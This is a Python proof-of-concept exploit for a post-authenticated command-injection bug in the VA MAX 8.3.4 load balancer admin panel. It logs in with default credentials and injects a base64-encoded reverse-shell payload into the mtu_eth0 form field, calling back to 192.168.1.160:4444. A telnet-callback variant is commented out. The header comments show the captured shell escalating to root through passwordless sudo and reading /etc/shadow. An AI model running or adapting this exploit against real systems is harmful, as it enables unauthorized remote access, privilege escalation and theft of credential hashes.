#!/usr/bin/env python
# quick poc for postauth rce bug in va max 8.3.4
#
# more:
#   https://code610.blogspot.com
#
# 10.02.2019
#

# p.s.
#
# listening on [any] 4444 ...
# 192.168.1.126: inverse host lookup failed: Unknown host
# connect to [192.168.1.160] from (UNKNOWN) [192.168.1.126] 58894
# sh: no job control in this shell
# sh-4.1$ id
# id
# uid=48(apache) gid=48(apache) groups=48(apache),10(wheel),18(dialout)
# sh-4.1$ cat /etc/shadow
# cat /etc/shadow
# cat: /etc/shadow: Permission denied
# sh-4.1$
# (...)
# sh-4.1$ sudo -l
# sudo -l
# Matching Defaults entries for apache on this host:
#     syslog_goodpri=debug, env_reset,
#     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
#
# User apache may run the following commands on this host:
#     (ALL) NOPASSWD: ALL
# sh-4.1$ sudo su
# sudo su
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# head -n1 /etc/shadow
# root:$6$dNu030j/gSf.5(...)4IlAEGpzHv0:15392:0:99999:7:::
#
#
# o/

import datetime, time
import requests
from requests.auth import HTTPBasicAuth

# defines
dateTime = datetime.datetime.now()
timestamp = int(time.mktime(dateTime.timetuple()))

remote_host = &#039;http://192.168.1.126:9080&#039;
our_user = &#039;loadbalancer&#039;
our_passwd = &#039;loadbalancer&#039;

# go
sess = requests.session()
logme = sess.post(remote_host, auth=HTTPBasicAuth(our_user, our_passwd))
logmeresp = logme.text


print &#039;\n\tsmall poc for VA MAX 8.3.4\n&#039;



# try to log in
if &#039;<title>Load Balancer Administration System&#039; in logmeresp:
  print &#039;[+] using credentials: %s : %s&#039; % ( our_user, our_passwd )
  print &#039;[+] our timestamp: %s&#039; % ( timestamp )

  print &#039;[+] proceed.&#039;

  getme = remote_host + &#039;/lbadmin/config/changeip.php?action=modip&l=e&t=&#039; + str(timestamp)
  dogetme = sess.get(getme, auth=HTTPBasicAuth(our_user, our_passwd))
  getmeresp = dogetme.text


  payload = "h4x;echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9J                                                                               TkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4xLjE2MCIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3                                                                               MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jwo=                                                                                | base64 -d | sh;#"

  #payload = "h4x;telnet 192.168.1.160 4444;#"
  #payload = &#039;;id>/tmp/id.id.id&#039;
  # print &#039;[i] using payload:&#039;, payload

  data_req = {
    &#039;eth0&#039; : &#039;192.168.1.126/24&#039;,
    &#039;mtu_eth0&#039; : &#039;1500&#039; + payload, # >.<
    &#039;eth1&#039; : &#039;&#039;,
    &#039;mtu_eth1&#039; : &#039;1500&#039;,
    &#039;eth2&#039; : &#039;&#039;,
    &#039;mtu_eth2&#039; : &#039;1500&#039;,
    &#039;eth3&#039; : &#039;&#039;,
    &#039;mtu_eth3&#039; : &#039;1500&#039;,
    &#039;go&#039; : &#039;Configure+Interfaces&#039;
  }
  shLink = remote_host + &#039;/lbadmin/config/changeip.php?action=modip&l=e&t=&#039; + str(timestamp)
  shellWe = sess.post(shLink, data=data_req, auth=HTTPBasicAuth(our_user, our_passwd))
  shResp = shellWe.text

  # check sudo -l now :>
  print &#039;\n\nThanks.Bye.\n&#039;

